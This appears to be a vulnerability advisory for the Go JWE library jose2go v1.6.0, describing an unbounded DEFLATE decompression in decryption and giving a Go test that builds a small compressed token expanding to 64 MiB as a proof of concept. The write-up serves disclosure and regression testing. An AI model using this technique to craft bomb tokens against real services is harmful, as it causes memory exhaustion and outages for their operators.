# Decompression bomb in jose2go JWE decryption (zip=DEF)

jose2go (v1.6.0, commit 48ba0b76bc881767cff2723388f4dd1a47c5104a) inflates the plaintext of a compressed JWE without
any size limit.

`decrypt` in `jose.go` calls `Decompress` on the registered compression algorithm
whenever the header has `"zip": "DEF"`. `(*Deflate).Decompress` in `deflate.go` runs
`ioutil.ReadAll(flate.NewReader(...))`, so a token of a few tens of kilobytes can
expand to hundreds of megabytes (deflate reaches ~1000:1 on repetitive data).

Impact: memory exhaustion / OOM kill of any service that decodes JWE tokens from
untrusted senders, since the attacker only needs a key the server will accept (for
example the server's public RSA key for `RSA-OAEP`).

## Reproduce

Drop this test into the repository root at commit `48ba0b76bc881767cff2723388f4dd1a47c5104a` and run `go test -run TestPoC -count=1 .` from that directory. It fails (or panics) on the affected code and passes once the issue is fixed.

```go
package jose

import (
	"strings"
	"testing"
)

// Adapted from the fix commit's sec_test/security_vulnerabilities_test.go
// (Test_DeflateBomb), scaled down and using a direct symmetric key instead of
// the test RSA pair. A 64 MiB payload compresses to about 64 KiB. Vulnerable:
// decrypt calls Deflate.Decompress, which inflates the whole payload with no
// size limit. Fixed: decompression stops at 250 KiB with ErrSizeExceeded.
func TestPoCDeflateBomb(t *testing.T) {
	key := make([]byte, 16)
	token, err := Encrypt(strings.Repeat("U", 64<<20), DIR, A128GCM, key, Zip(DEF))
	if err != nil {
		t.Fatal(err)
	}
	payload, _, err := Decode(token, key)
	if err == nil {
		t.Fatalf("expected a size-limit error, got nil and a %d byte payload from a %d byte token", len(payload), len(token))
	}
}
```
